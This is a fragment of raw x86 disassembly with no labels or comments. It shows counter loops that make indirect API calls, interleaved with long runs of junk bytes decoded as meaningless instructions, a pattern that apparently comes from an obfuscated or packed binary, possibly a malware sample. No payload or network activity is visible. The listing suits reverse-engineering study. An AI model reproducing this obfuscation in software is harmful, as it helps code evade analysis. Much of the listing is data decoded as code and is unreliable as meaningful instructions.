  4082e7:	not    esi
  4082e9:	fxch   st(6)
  4082eb:	fsub   st(1),st
  4082ed:	sub    edx,DWORD PTR [esi-0x4e]
  4082f0:	dec    edi
  4082f1:	sbb    ecx,DWORD PTR [edi]
  4082f3:	repnz xor cl,BYTE PTR [esi]
  4082f6:	add    DWORD PTR [ebx+0x69ef504],edi
  4082fc:	ds stos BYTE PTR es:[edi],al
  4082fe:	add    edi,DWORD PTR [esi]
  408300:	pop    ds
  408301:	add    ebp,DWORD PTR [ecx]
  408303:	fiadd  WORD PTR [eax-0x4e]
  408306:	sub    ch,ah
  408308:	stos   DWORD PTR es:[edi],eax
  408309:	scas   al,BYTE PTR es:[edi]
  40830a:	retf   
  40830b:	scas   al,BYTE PTR es:[edi]
  40830c:	mov    ds:0xd64ca384,al
  408311:	inc    eax
  408312:	add    BYTE PTR [ebx+0x8b0845],cl
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4235db,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4235db
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4235db,ecx
  408347:	cmp    DWORD PTR ds:0x4235db,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4235db,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4235db,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4235db
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4235db,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4235db,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [ecx+ecx*1+0x616872aa],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x40848b
  40840c:	pop    edx
  40840d:	cmp    BYTE PTR [ecx],al
  40840f:	cmp    eax,DWORD PTR [esi+0x46]
  408412:	ret    
  408413:	or     al,0xf6
  408415:	gs push edi
  408417:	mov    esi,0xcf9fb373
  40841c:	inc    ebx
  40841d:	add    eax,DWORD PTR [esi-0x47851318]
  408423:	push   cs
  408424:	mov    esp,0x9d04259d
  408429:	and    al,0x5f
  40842b:	call   0xd02c2755
  408430:	(bad)  
  408431:	jo     0x408453
  408433:	push   es
  408434:	inc    edx
  408435:	xchg   edi,eax
  408436:	out    dx,al
  408437:	adc    DWORD PTR [esi-0x31a427ce],eax
  40843d:	out    dx,al
  40843e:	pop    esi
  40843f:	jg     0x40845e
  408441:	pop    eax
  408442:	pop    ebp
  408443:	fcomip st,st(4)
  408445:	(bad)  
  408446:	sub    eax,0x1e27d022
  40844b:	gs stos BYTE PTR es:[edi],al
  40844d:	adc    al,0xa5
  40844f:	outs   dx,DWORD PTR ds:[esi]
  408450:	sbb    BYTE PTR [ecx+edi*2],ch
  408453:	shl    esp,0x19
  408456:	mov    ecx,0x6287dcfc
  40845b:	or     eax,0x3ee7397f
  408460:	push   esi
  408461:	sbb    edx,DWORD PTR [edi*4-0x3756de81]
  408468:	mov    ebx,0xe071c5b7
  40846d:	gs adc eax,0x2fa6cb44
  408473:	push   cs
  408474:	pop    esp
  408475:	xchg   ebx,eax
  408476:	hlt    
  408477:	imul   edi,esp,0x9bd95402
  40847d:	(bad)  
  40847f:	in     eax,0x62
  408481:	push   edi
  408482:	retf   0x3494
  408485:	add    BYTE PTR [edx+0x48254cde],dh
  40848b:	fistp  QWORD PTR [esi]
  40848d:	sbb    bh,BYTE PTR [edi-0x4efd29b3]
  408493:	xchg   edi,eax
  408494:	fsub   DWORD PTR [esi+ebx*2-0x29]
  408498:	addr16 out dx,al
  40849a:	and    eax,0x38c1e9c0
  40849f:	les    ecx,FWORD PTR [edi]
  4084a1:	std    
  4084a2:	push   esi
  4084a3:	not    BYTE PTR [esi+0x4756b356]
  4084a9:	xchg   DWORD PTR [edi],esi
  4084ab:	inc    ecx
  4084ac:	gs clc 
  4084ae:	mov    BYTE PTR [edx-0x1db08ea0],ah
  4084b4:	sahf   
  4084b5:	mov    edi,DWORD PTR [ebx+esi*4+0x5b]
  4084b9:	div    BYTE PTR [esi-0x4f408b45]
  4084bf:	popa   
  4084c0:	fimul  DWORD PTR ds:0x838426f9
  4084c6:	cli    
  4084c7:	sub    al,0xb
  4084c9:	pushf  
  4084ca:	and    BYTE PTR gs:[eax-0x2c8dcf22],0xd1
  4084d2:	adc    eax,ebp
  4084d4:	add    al,0x2f
  4084d6:	push   0x71
  4084d8:	daa    
  4084d9:	sub    DWORD PTR [ecx+0x630ebbf7],eax
  4084df:	or     dl,BYTE PTR [ecx+ebx*1-0x5bc4396a]
  4084e6:	and    al,0xdf
  4084e8:	leave  
  4084e9:	and    ah,dl
  4084eb:	pop    edi
  4084ec:	xchg   ebx,eax
  4084ed:	push   ds
  4084ee:	shl    esi,0x9f
  4084f1:	retf   
  4084f2:	sbb    al,0x83
  4084f4:	mov    esp,0xa549c7ae
  4084fa:	lahf   
  4084fb:	in     al,dx
  4084fc:	(bad)  
  4084fd:	int    0xb7
  4084ff:	inc    edi
  408500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408501:	in     eax,dx
  408502:	or     DWORD PTR [edi],ebp
  408504:	call   0xbc84:0x757ba305
  40850b:	inc    eax
  40850c:	jge    0x40856f
  40850e:	sti    
  40850f:	jbe    0x408514
  408511:	pop    ss
  408512:	daa    
  408513:	add    edi,edx
  408515:	pop    ss
  408516:	shl    BYTE PTR [esi+0x33],1
  408519:	inc    ecx
  40851a:	and    BYTE PTR [ecx+0x3b0a],bh
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0xbb26a896
  40854d:	pop    es
  40854e:	test   edi,ebp
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4085a0
  408559:	scas   eax,DWORD PTR es:[edi]
  40855a:	and    ebx,DWORD PTR [esi-0x2d17e640]
  408560:	jbe    0x408527
  408562:	std    
  408563:	call   0xbc7e022c
  408568:	inc    ecx
  408569:	(bad)  
  40856a:	jmp    0x2e2114d8
  40856f:	xor    al,0x35
  408571:	ret    
  408572:	ret    0x575b
  408575:	in     al,0xb8
  408577:	neg    al
  408579:	and    BYTE PTR [ebx+esi*8+0x29151b72],bl
  408580:	stc    
  408581:	xchg   esp,eax
  408582:	jmp    0x44f67599
  408587:	sbb    eax,0x65af3175
  40858c:	mov    DWORD PTR [ecx-0x5a],ebp
  40858f:	xchg   esi,eax
  408590:	xor    eax,0xab52a6ad
  408595:	add    bl,dh
  408597:	repnz aas 
  408599:	dec    esi
  40859a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40859b:	sbb    DWORD PTR [ebp+ebp*4-0x5fadab42],0x4c0bc343
  4085a6:	daa    
  4085a7:	xlat   BYTE PTR ds:[ebx]
  4085a8:	addr16 rcr cl,cl
  4085ab:	lods   al,BYTE PTR ds:[esi]
  4085ac:	push   ss
  4085ad:	push   0x9726651a
  4085b2:	sub    eax,0x92082fb6
  4085b7:	mov    ebx,0xcf8f9ced
  4085bc:	cs dec esi
  4085be:	aaa    
  4085bf:	retf   0x1474
  4085c2:	in     al,dx
  4085c3:	inc    ebp
  4085c4:	pop    ebx
  4085c5:	arpl   WORD PTR [esi],dx
  4085c7:	or     DWORD PTR [esi+0x40f62857],ebx
  4085cd:	sub    DWORD PTR [edx+0x65c3e7ab],0x61
  4085d4:	push   eax
  4085d5:	aad    0xec
  4085d7:	cmp    esp,DWORD PTR [esi+0x5a1ddae0]
  4085dd:	sbb    BYTE PTR [esi+ebx*8-0x74345c95],dh
  4085e4:	fnstenv [ebx]
  4085e6:	fild   DWORD PTR [edx-0x3]
  4085e9:	add    bh,BYTE PTR [edi+0x33896648]
  4085ef:	cmc    
  4085f0:	iret   
  4085f1:	inc    esp
  4085f2:	mov    ds:0xeab1f359,al
  4085f7:	cmp    ecx,DWORD PTR [edi]
  4085f9:	repnz xor cl,BYTE PTR [esi+ebx*1-0x4d134fd8]
  408601:	fs retf 
  408603:	mov    WORD PTR [esi],es
  408605:	xchg   esi,eax
  408606:	cmc    
  408607:	js     0x408668
  408609:	shl    DWORD PTR [ebx+0x51b6dddf],cl
  40860f:	repz pop DWORD PTR [edx+edx*1+0x58]
  408614:	dec    edx
  408615:	push   cs
  408616:	push   edi
  408617:	cs push ebx
  408619:	out    0x81,al
  40861b:	pop    esi
  40861c:	hlt    
  40861d:	inc    ebx
  40861e:	sub    esi,DWORD PTR ds:0x5848192f
  408624:	mov    ecx,0x9f8ddfbf
  408629:	mov    edi,0xeddd0323
  40862e:	js     0x4086a4
  408630:	sbb    esp,DWORD PTR [ecx+0x48]
  408633:	jne    0x408674
  408635:	loop   0x408677
  408637:	pop    esi
  408638:	push   ebx
  408639:	mov    al,ds:0xd6820d54
  40863e:	jp     0x40868f
  408640:	or     BYTE PTR [ecx],cl
  408642:	inc    eax
  408643:	add    BYTE PTR gs:[ecx+edx*8-0x12b8f8d5],0x44
  40864c:	(bad)
  408650:	sub    eax,0x4826fd6e
  408655:	push   esp
  408656:	test   al,0xe6
  408658:	retf   
  408659:	dec    edi
  40865a:	mov    ah,0x85
  40865c:	push   edx
  40865d:	loop   0x40867e
  40865f:	push   ds
  408660:	mov    WORD PTR [ecx],cs
  408662:	in     eax,0xc8
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4235d7,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fidivr DWORD PTR [eax+0x95058a3]
  408745:	sub    edi,DWORD PTR [esi+0x7e]
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x4087a5
  40874d:	nop
  40874e:	das    
  40874f:	in     al,0x9a
  408751:	fcomi  st,st(6)
  408753:	call   0xccb6:0x832ec933
  40875a:	sbb    DWORD PTR [esi+0x36cee494],esi
  408760:	dec    ebp
  408761:	ror    BYTE PTR [ecx+ebx*8+0x1b986186],cl
  408768:	call   0x48b2:0x3f20d169
  40876f:	retf   0xd630
  408772:	int3   
  408773:	push   0x41349290
  408778:	inc    ebp
  408779:	clc    
  40877a:	fwait
  40877b:	cdq    
  40877c:	hlt    
  40877d:	jle    0x408714
  40877f:	out    0xc4,eax
  408781:	popf   
  408782:	inc    eax
  408783:	mov    eax,0x189c9c17
  408788:	add    BYTE PTR es:[ebp+0x2035c73a],bh
  40878f:	ds xchg edx,eax
  408791:	add    BYTE PTR [esi-0x1d28b0c3],0xa
  408798:	es push ebp
  40879a:	mov    BYTE PTR [edi],cl
  40879c:	cmc    
  40879d:	lods   eax,DWORD PTR ds:[esi]
  40879e:	pop    es
  40879f:	aas    
  4087a0:	jnp    0x408807
  4087a2:	sub    al,0x2b
  4087a4:	xchg   ebp,eax
  4087a5:	cmp    ebp,esp
  4087a7:	dec    ebx
  4087a8:	les    esi,FWORD PTR [ecx-0x3434fd92]
  4087ae:	inc    ebx
  4087af:	out    0x68,eax
  4087b1:	xchg   BYTE PTR [ecx+0x35962369],bl
  4087b7:	lods   al,BYTE PTR ds:[esi]
  4087b8:	xor    BYTE PTR [ecx+0x5a],al
  4087bb:	(bad)
  4087be:	xchg   ecx,eax
  4087bf:	js     0x408840
  4087c1:	pop    esi
  4087c2:	lods   al,BYTE PTR ds:[esi]
  4087c3:	es mov edx,0xa800b851
  4087c9:	nop
  4087ca:	in     eax,0xdc
  4087cc:	ja     0x4087f6
  4087ce:	mov    bl,0xc6
  4087d0:	jmp    0xd534:0x100a9dbe
  4087d7:	sbb    eax,0xe5502ae7
  4087dc:	fbstp  TBYTE PTR [bx+si+0x77]
  4087e0:	sbb    ah,ah
  4087e2:	dec    edi
  4087e3:	cmp    al,0xa4
  4087e5:	(bad)  
  4087e6:	jmp    0x71a2010d
  4087eb:	mov    ecx,0x45f84db
  4087f0:	arpl   WORD PTR [ecx-0x64],si
  4087f3:	or     DWORD PTR [esi-0x5b],ecx
  4087f6:	sbb    edi,0xffffffd8
  4087f9:	push   ebp
  4087fa:	nop
  4087fb:	nop
  4087fc:	xchg   esp,eax
  4087fd:	pop    edi
  4087fe:	mov    al,ds:0x99587ef7
  408803:	jns    0x408796
  408805:	fnstsw WORD PTR [ecx-0x53]
  408808:	sub    esi,DWORD PTR [ebp+0x2]
  40880b:	sbb    DWORD PTR [esi+ebp*2-0x70],0x49
  408810:	in     al,dx
  408811:	loopne 0x40881d
  408813:	(bad)
  408818:	mov    bh,0xf1
  40881a:	fsub   DWORD PTR [esi-0x133d748c]
  408820:	sbb    DWORD PTR [eax],edi
  408822:	dec    ebp
  408823:	ins    BYTE PTR es:[edi],dx
  408824:	cmp    BYTE PTR [ebx+edi*4-0x2289c852],ch
  40882b:	push   0xffffffd6
  40882d:	mov    ds:0x388964dc,al
  408832:	sbb    al,0x7e
  408834:	outs   dx,DWORD PTR ds:[esi]
  408835:	lea    ebp,[ebx+edx*2-0x85fba57]
  40883c:	imul   edi,DWORD PTR [ebx+0x17],0xa45b8e9e
  408843:	mov    al,ds:0x736dfe2
  408848:	add    al,0x63
  40884a:	inc    edi
  40884b:	(bad)  
  40884c:	pop    ds
  40884d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40884e:	repz fimul DWORD PTR [ebx+0x7eeb0190]
  408855:	cmp    ecx,eax
  408857:	xchg   edi,eax
  408858:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40885f:	adc    DWORD PTR ds:0x412370,0x1786
  408869:	mov    DWORD PTR [ebp-0x10],0xf89c853b
  408870:	mov    eax,DWORD PTR [ebp-0x8]
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0x6bd74167],edx
  408951:	daa    
  408952:	xchg   ecx,edi
  408954:	add    eax,0xa7e7e28
  408959:	jg     0x4089d9
  40895b:	jle    0x408915
  40895d:	adc    ebx,DWORD PTR [ebx+0x58]
  408960:	inc    ebx
  408961:	fwait
  408962:	clc    
  408963:	sub    eax,0xd2cca4a7
  408968:	cwde   
  408969:	mov    BYTE PTR [eax],dh
  40896b:	mov    BYTE PTR [esi+0x47],al
  40896e:	out    dx,al
  40896f:	push   0xc468e715
  408974:	mov    esi,DWORD PTR [ebx]
  408976:	push   edi
  408977:	xor    edx,edi
  408979:	mov    esi,0x7598f6e0
  40897e:	xor    al,0xbc
  408980:	dec    edi
  408981:	fcomp  QWORD PTR [eax+0x75]
  408984:	add    eax,0x1e0c6e7c
  408989:	dec    esi
  40898a:	test   al,0x75
  40898c:	jne    0x408988
  40898e:	shr    edx,cl
  408990:	fbstp  TBYTE PTR [esi+ecx*4-0x578926a3]
  408997:	xchg   esi,eax
  408998:	mov    bh,BYTE PTR [edx+0x28]
  40899b:	pop    ebp
  40899c:	ds adc cl,dh
  40899f:	mov    al,ds:0x805563b
  4089a4:	add    al,0x2b
  4089a6:	pop    ecx
  4089a7:	es scas al,BYTE PTR es:[edi]
  4089a9:	adc    eax,0x5085e3f4
  4089ae:	aad    0xb8
  4089b0:	mov    dl,0x22
  4089b2:	xor    al,0x93
  4089b4:	add    dl,BYTE PTR ds:[edi+ecx*8-0x7]
  4089b9:	lock cmp cx,WORD PTR [edx+0xc]
  4089be:	icebp  
  4089bf:	lods   al,BYTE PTR ds:[esi]
  4089c0:	sbb    ecx,DWORD PTR [ebx+0x1d]
  4089c3:	add    ecx,DWORD PTR [edi+ebx*1-0x46]
  4089c7:	pop    edx
  4089c8:	les    edx,FWORD PTR [ebp-0xa]
  4089cb:	aam    0xfd
  4089cd:	lods   eax,DWORD PTR ds:[esi]
  4089ce:	test   DWORD PTR [ecx-0x3299b5d1],0xd493a2b9
  4089d8:	mov    ch,0xe9
  4089da:	call   0xe2a9c070
  4089df:	pop    edx
  4089e0:	lahf   
  4089e1:	jp     0x408a10
  4089e3:	into   
  4089e4:	mov    ebp,0xe2df6a79
  4089e9:	je     0x408a26
  4089eb:	jo     0x4089a1
  4089ed:	into   
  4089ee:	adc    DWORD PTR [edx+0x78cc2afd],esp
  4089f4:	xor    ebp,ebp
  4089f6:	ja     0x4089f5
  4089f8:	or     eax,0x8af903c4
  4089fd:	pop    edx
  4089fe:	pushf  
  4089ff:	jbe    0x408a1e
  408a01:	and    BYTE PTR [ecx+0x369a2049],bl
  408a07:	ror    DWORD PTR [eax-0x29df58f9],1
  408a0d:	mov    DWORD PTR [ebp+0x7e],ecx
  408a10:	int    0x15
  408a12:	pop    ds
  408a13:	aas    
  408a14:	jp     0x4089e8
  408a16:	(bad)  
  408a17:	retf   0x6f5f
  408a1a:	out    dx,al
  408a1b:	and    BYTE PTR [eax+esi*4],0x8
  408a1f:	stc    
  408a20:	int3   
  408a21:	mov    WORD PTR [ebx-0x11a6f83],fs
  408a27:	out    dx,al
  408a28:	shr    BYTE PTR [eax+eiz*8-0x6c9035d8],cl
  408a2f:	push   esi
  408a30:	add    ch,ah
  408a32:	or     BYTE PTR [eax+0x64b353f3],0xcb
  408a39:	mov    ds:0xe3bf6451,al
  408a3e:	mov    edi,0xd962a86b
  408a43:	mov    esp,0x40720306
  408a48:	out    0xb,al
  408a4a:	and    ebp,eax
  408a4c:	ins    BYTE PTR es:[edi],dx
  408a4d:	into   
  408a4e:	fimul  DWORD PTR [edx]
  408a50:	lds    edx,FWORD PTR [edi+0x55]
  408a53:	add    eax,0x1b89049a
  408a58:	loop   0x408a3b
  408a5a:	mov    dl,0x2b
  408a5c:	sub    DWORD PTR [ecx+0x575c8593],eax
  408a62:	adc    edx,esp
  408a64:	cmp    edx,DWORD PTR [ecx-0x2ecc22b0]
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	lods   al,BYTE PTR ds:[esi]
  408a86:	retf   0xec99
  408a89:	adc    DWORD PTR [ecx],ebp
  408a8b:	jle    0x408b0b
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408ae3
  408a92:	sub    BYTE PTR [edi-0x13],0x10
  408a96:	call   0xc5bb:0xab1b3cc6
  408a9d:	adc    eax,0x322f1351
  408aa2:	add    bl,BYTE PTR [ecx-0x54bcb137]
  408aa8:	or     eax,0x72184555
  408aad:	cmp    eax,0xe5828904
  408ab2:	cmc    
  408ab3:	and    eax,0x1ed61cf2
  408ab8:	xchg   ebp,eax
  408ab9:	retf   
  408aba:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  408abc:	lahf   
  408abd:	push   edi
  408abe:	cmp    ah,BYTE PTR [ebp+0x254ad50b]
  408ac4:	push   ds
  408ac5:	inc    ebx
  408ac6:	inc    esp
  408ac7:	fs add al,0x42
  408aca:	test   BYTE PTR [ebx+0x5bb0f0c2],ah
  408ad0:	jne    0x408a53
  408ad2:	data16 mov bl,0x5f
  408ad5:	outs   dx,DWORD PTR ds:[esi]
  408ad6:	into   
  408ad7:	add    edi,DWORD PTR ds:0x9ef816b1
  408add:	mul    BYTE PTR [ebp+0x103fde80]
  408ae3:	jmp    0xcc4abb9c
  408ae8:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  408aeb:	shr    dl,1
  408aed:	stos   DWORD PTR es:[edi],eax
  408aee:	addr16 in al,0x1b
  408af1:	xor    bl,cl
  408af3:	push   0xfffffffb
  408af5:	leave  
  408af6:	iret   
  408af7:	fimul  WORD PTR [edi-0x7597f275]
  408afd:	push   esp
  408afe:	mov    es,ebx
  408b00:	cmp    al,0xc3
  408b02:	dec    ebx
  408b03:	cld    
  408b04:	mov    bh,0x1e
  408b06:	mov    ecx,0x35ff584c
  408b0b:	je     0x408a93
  408b0d:	js     0x408b79
  408b0f:	jmp    0xcfe92e49
  408b14:	in     al,0xd1
  408b16:	mul    DWORD PTR [ecx-0x66]
  408b19:	jns    0x408b71
  408b1b:	cmp    eax,0xdf1981cf
  408b20:	not    dh
  408b22:	or     DWORD PTR [ebp+0x14],0xffffffc6
  408b26:	mov    edi,0x3fa7d99e
  408b2b:	sub    ecx,DWORD PTR ds:[esi-0x17]
  408b2f:	cs mov edi,0xde9f775f
  408b35:	cdq    
  408b36:	jmp    0x408bb0
  408b38:	push   ds
  408b39:	(bad)  
  408b3b:	imul   esi,DWORD PTR [ecx+0x6f5bfd93],0x51aae277
  408b45:	jmp    0x408b93
  408b47:	pop    ecx
  408b48:	and    ah,BYTE PTR [esi]
  408b4a:	dec    ecx
  408b4b:	test   BYTE PTR [ebp+0x7f],bl
  408b4e:	sub    BYTE PTR [edi+eax*8+0x6e33c338],0x4a
  408b56:	ret    0xca98
  408b59:	leave  
  408b5a:	mov    cl,0xf2
  408b5c:	jge    0x408b3b
  408b5e:	mov    ds,WORD PTR cs:[eax]
  408b61:	shr    DWORD PTR [edi-0x66b65945],1
  408b67:	pop    eax
  408b68:	add    BYTE PTR [esi-0x46],dl
  408b6b:	sub    BYTE PTR [ebp-0x7f92a6b8],0x91
  408b72:	pop    eax
  408b73:	lock sub esi,DWORD PTR [edx-0x1e]
  408b77:	rol    ecx,1
  408b79:	pop    edi
  408b7a:	jp     0x408b4f
  408b7c:	jnp    0x408b89
  408b7e:	sbb    eax,0xcf5044b0
  408b83:	jle    0x408b61
  408b85:	call   0x9e790a25
  408b8a:	inc    eax
  408b8b:	sbb    ah,0x62
  408b8e:	rol    BYTE PTR ds:0xb7da3180,0x32
  408b95:	sti    
  408b96:	cwde   
  408b97:	dec    edx
  408b98:	fwait
  408b99:	and    al,0x7b
  408b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b9c:	jbe    0x408bf1
  408b9e:	push   edi
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0x39ec9643]
  408bcf:	test   al,0x52
  408bd1:	leave  
  408bd2:	sub    eax,0xa7e7e2e
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408c26
  408bdb:	mov    ch,0x5c
  408bdd:	scas   eax,DWORD PTR es:[edi]
  408bde:	pushf  
  408bdf:	or     BYTE PTR cs:[ecx-0x2b],0x82
  408be4:	xor    edx,DWORD PTR [eax+0x3d]
  408be7:	mov    esp,0x42a89a3c
  408bec:	and    eax,DWORD PTR [edi]
  408bee:	mov    bl,0x6b
  408bf0:	or     DWORD PTR [edi+ecx*8],0x54
  408bf4:	mov    ebp,DWORD PTR [ecx+0x10b2ed1]
  408bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bfb:	mov    esi,edx
  408bfd:	in     eax,dx
  408bfe:	sub    al,0xd8
  408c00:	div    BYTE PTR [esi]
  408c02:	psubd  mm4,mm2
  408c05:	jae    0x408c24
  408c07:	mov    ch,0x6
  408c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c0a:	xchg   edx,eax
  408c0b:	fild   QWORD PTR [ebp-0x27d1f674]
  408c11:	lods   al,BYTE PTR ds:[esi]
  408c12:	add    BYTE PTR [ecx],bl
  408c14:	fs retf 0x7922
  408c18:	sbb    al,0xa5
  408c1a:	cmp    DWORD PTR [ebp+0x57],eax
  408c1d:	inc    edx
  408c1e:	mov    edi,0x15f668c1
  408c23:	add    ebp,DWORD PTR [ebx]
  408c25:	popa   
  408c26:	inc    eax
  408c27:	adc    ebx,esi
  408c29:	lock stos DWORD PTR es:[edi],eax
  408c2b:	aad    0x81
  408c2d:	in     al,0xc9
  408c2f:	out    dx,eax
  408c30:	sbb    BYTE PTR [edi+0x3ad959cd],dl
